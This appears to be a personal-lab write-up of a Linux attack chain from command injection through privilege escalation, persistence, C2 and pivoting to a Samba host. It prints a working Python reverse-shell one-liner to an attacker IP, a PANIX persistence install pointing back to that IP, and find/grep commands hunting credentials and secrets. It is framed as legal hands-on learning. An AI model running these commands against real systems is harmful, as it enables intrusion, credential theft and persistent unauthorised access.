# A Journey Through a Linux Attack Chain (Lab Practice)

[🇮🇩 Baca dalam Bahasa Indonesia](A-Journey-Through-a-Linux-Attack-Chain-%28Lab-Practice%29-id.md)

This is a practical attack chain I built in my personal lab. The goal was to practice pattern recognition and understand how a single initial access can develop into a complete attack chain. Some parts of the lab (Copy.Fail and the Samba CVE) were intentionally configured to be vulnerable for testing purposes.

**Lab Topology:**

```text
+----------------+          +----------------------+          +----------------+
| Kali Linux     |          | Ubuntu Server01      |          | Debian Server02|
| 10.10.10.149   |--------->| Pivot Host           |--------->| 192.168.15.2   |
| Attacker       |          | Mutillidae II        |          | Samba 4.22.9   |
| AdaptixC2      |          | ens33 : 10.10.10.2   |          | Internal Host  |
| nc / Proxychains|         | ens37 : 192.168.15.3 |          |                |
+----------------+          +----------------------+          +----------------+
        Attacker Network               Internal Network
          10.10.10.0/24                 192.168.15.0/24
```

**Overall Flow:**

```text
Command Injection
        │
        ▼
Reverse Shell (www-data)
        │
        ▼
Basic Enumeration
        │
        ▼
File System Exploration
        │
        ▼
Privilege Enumeration
        │
        ▼
Privilege Escalation (Copy.Fail → root)
        │
        ▼
Persistence (PANIX)
        │
        ▼
Foothold and Command & Control (Adaptix C2)
        │
        ▼
Pivoting (SOCKS5 Tunnel)
        │
        ▼
Lateral Movement (Samba CVE-2026-4480)
```

---

I started with Command Injection in Mutillidae II. After gaining command execution, I created a reverse shell payload using One-Lin3r.

![List Payload One-Lin3r](one-lin3r-list.png)

I chose `linux/python/socket_reverse` with the listener `10.10.10.149:9001`.

![Craft Payload](Craft-the-payloads-revershell.png)

```python
python3 -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();'
```

I started the listener:

```bash
nc -lvnp 9001
```

I inserted the payload into the vulnerable parameter.

![Command Injection](command-injection.png)

This resulted in:

![Backdoor Connection](backdoor-terkoneksi.png)

An interactive shell as `www-data` was successfully obtained.

---

The initial shell was still limited, so I configured the `TERM` variable first.

![Reverse Shell](Variable-term-not-set.png)

Then I upgraded it to an interactive TTY.

![interactive](interactive.png)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm-256color

# Ctrl+Z → stty raw -echo && fg → reset → stty rows ... columns ...
```

After that, I gathered some basic information.

![Current User](user.png)

```bash
whoami

id

groups
```

The user was `www-data`.

![Host Information](fingerprint.png)

```bash
hostname

uname -a

cat /etc/os-release
```

The system was running Ubuntu 24.04.4 LTS, kernel 6.8, x86_64.

![Current Directory](location.png)

```bash
pwd

ls -la
```

The current location was the Mutillidae application directory.

![Network Configuration](network.png)

```bash
ip addr

ip route
```

![Running Process](ps-aux.png)

```bash
ps aux
```

The visible services included Apache, Nginx, MariaDB, OpenSSH, and Cron.

---

I continued with file system exploration.

![current-dir](current-directory.png)

```bash
pwd

ls -lah
```

![Directory Structure](directory-structure.png)

```bash
find "$(pwd)" -mindepth 1 -maxdepth 2 -type d
```

![Application Files](application-files.png)

```bash
printf '%s\n' "$PWD"/**/* 2>/dev/null | grep -Ei 'login|auth|register|upload|admin|config|database|db|user|account|password|secret|key|token|credential|backup|\.env|\.sql|\.bak|\.old|\.zip'
```

![Sensitive Information Discovery](sensitive-information-discovery.png)

```bash
find . -type f \( -iname "*.env" -o -iname "*.ini" -o -iname "*.conf" -o -iname "*.cnf" -o -iname "*.xml" -o -iname "*.sql" -o -iname "*.bak" -o -iname "*.old" -o -iname "*.txt" -o -iname "*.log" -o -iname "*.yml" -o -iname "*.yaml" \) -exec grep -HinE 'user(name)?|pass(word)?|host(name)?|database|db|token|secret|api[\_-]?key|credential' {} + 2>/dev/null
```

![File Permissions](file-permissions.png)

```bash
find . -maxdepth 2 -printf "%M %u:%g %p\n"
```

---

Next, I moved on to privilege enumeration.

![Current User](current-user.png)

```bash
id
```

![Sudo Configuration](sudo-configuration.png)

```bash
sudo -l
```

![SUID Binary](suid-binary.png)

```bash
find / -perm -4000 -type f 2>/dev/null
```

![Linux Capabilities](linux-capabilities.png)

```bash
getcap -r / 2>/dev/null
```

![Scheduled Tasks](scheduled-tasks.png)

![Filesystem Cron](cron-filesystem.png)

```bash
cat /etc/crontab

ls -la /etc/cron.*
```

![Running Services](running-services.png)

```bash
systemctl list-units --type=service
```

![Environment Variables](environment-variables.png)

```bash
env
```

![Writable Directories](writable-directories.png)

```bash
find / -writable -type d 2>/dev/null
```

![Home Directories](home-directories.png)

```bash
ls -lah /home
```

![Kernel Information](kernel-information.png)

```bash
uname -r
```

---

Based on the kernel version I found, I verified it against Copy.Fail (CVE-2026-31431), which I had intentionally prepared in the lab.

![Kernel Version](kernel-version.png)

```bash
uname -r
```

![Copy.Fail Check](copyfail-check.png)

```bash
python3 test.py
```

After the preconditions were met, I ran the exploit.

![Privilege Escalation](privilege-escalation.png)

```bash
python3 exploit.py
```

Privileges were escalated from `www-data` to `root`.

---

With root access, I established persistence using the PANIX `systemd.generator` module.

![PANIX](root.png)

```bash
curl -sL https://github.com/Aegrah/PANIX/releases/download/panix-v2.1.0/panix.sh -o panix.sh

chmod +x panix.sh
```

![Systemd Generator](systemd-generator.png)

```bash
bash panix.sh --generator --ip 10.10.10.149 --port 9001
```

I rebooted the target.

![Reboot](reboot.png)

After the reboot, the reverse shell returned automatically.

![Interaktif](interaktif.png)

---

I then switched the stable access to a C2 session using the Adaptix Framework.

![adaptix](adaptix.png)

The agent was executed and immediately called back.

![adaptix-cli](adaptix-project-cli.png)

![listener](listener.png)

```text
Callback Address

10.10.10.149:9001
```

![adaptix](console-remote-terminal.png)

An interactive session was available through AdaptixC2.

---

The Ubuntu host has two network interfaces. From there, I established a SOCKS5 tunnel to reach the internal network.

![firewall](network-firewall.png)

![proxychains-ssh](proxychains-ssh-validation-pivoting-network-login-testing.png)

![create-tunnel-agent](create-tunnel-agent.png)

![create-tunnel-socks5-teamserver](create-tunnel-socks5-teamserver.png)

![remote-victim-ip](remote-info-ip-victim.png)

![success-tunnel-pivot](success-tunnel-pivot.png)

I routed the traffic through Proxychains.

![Scanning-internal-zenmap](Scanning-internal-zenmap.png)

![scanning-internal](scanning-internal-used-proxychains.png)

The internal host `192.168.15.2` was found running SSH, Samba, and CUPS services.

---

I validated the Samba 4.22.9 service on Debian Server02 against CVE-2026-4480, using the Samba lab that I had also prepared.

![Scanning-internal-zenmap](Scanning-internal-zenmap.png)

![scanning-internal-nmap](scanning-internal-used-proxychains.png)

![information-smb-client-debian](information-smb-client-debian.png)

![Lateral movement exploit samba cve 2026 4480](Lateral-movement-exploit-samba-cve-2026-4480.png)

I forwarded the connection through the pivot host using Proxychains and a SOCAT relay. A shell was successfully obtained as the `nobody` user on Debian Server02.

---

I hope this write-up is useful for others who are learning and growing in hacking, especially those who want to understand Linux and security through hands-on practice in a legal lab environment. I also hope it can serve as a reference or learning material for further exploration.

---

### References

<details>

<summary><strong>Personal Lab</strong></summary>

* Copy.Fail Lab (CVE-2026-31431) — https://github.com/iMoon07/OWASP-Lab-Toolkit/tree/main/CVE-2026-31431

* Samba CVE-2026-4480 Lab — https://github.com/iMoon07/OWASP-Lab-Toolkit/tree/main/CVE-2026-4480

</details>

<details>

<summary><strong>Tools & Frameworks</strong></summary>

* One-Lin3r — https://github.com/D4Vinci/One-Lin3r

* PANIX — https://github.com/Aegrah/PANIX

* Adaptix Framework — https://adaptix-framework.gitbook.io/adaptix-framework/

* AdaptixC2 — https://github.com/Adaptix-Framework/AdaptixC2

* Proxychains-ng — https://github.com/rofl0r/proxychains-ng

</details>

<details>

<summary><strong>Cheat Sheets & Documentation</strong></summary>

* PayloadsAllTheThings – Reverse Shell — https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

* PentestMonkey – Reverse Shell Cheat Sheet — https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet/

* GTFOBins — https://gtfobins.github.io/

* Ropnop – Upgrading Simple Shells to Fully Interactive TTY — https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

* GNU Coreutils Manual — https://www.gnu.org/software/coreutils/manual/

* GNU Findutils Manual — https://www.gnu.org/software/findutils/manual/

* systemd.generator Manual — https://man7.org/linux/man-pages/man7/systemd.generator.7.html

* Linux Manual Pages — https://man7.org/linux/man-pages/

* Nmap Documentation — https://nmap.org/docs.html

* Samba Documentation — https://www.samba.org/samba/docs/

</details>

<details>

<summary><strong>Vulnerability & Advisory</strong></summary>

* Copy.Fail Research — https://copy.fail/

* CERT/CC VU#260001 — https://kb.cert.org/vuls/id/260001

* Samba Security Advisory – CVE-2026-4480 — https://www.samba.org/samba/security/CVE-2026-4480.html

* NVD CVE-2026-4480 — https://nvd.nist.gov/vuln/detail/CVE-2026-4480

</details>

<details>

<summary><strong>MITRE ATT&CK</strong></summary>

* T1059 – Command and Scripting Interpreter

* T1082 – System Information Discovery

* T1016 – System Network Configuration Discovery

* T1057 – Process Discovery

* T1083 – File and Directory Discovery

* T1068 – Exploitation for Privilege Escalation

* T1543.002 – Systemd Service

* T1547 – Boot or Logon Autostart Execution

* T1090 – Proxy

* T1046 – Network Service Discovery

* TA0008 – Lateral Movement

* TA0011 – Command and Control

* T1219 – Remote Access Software

</details>
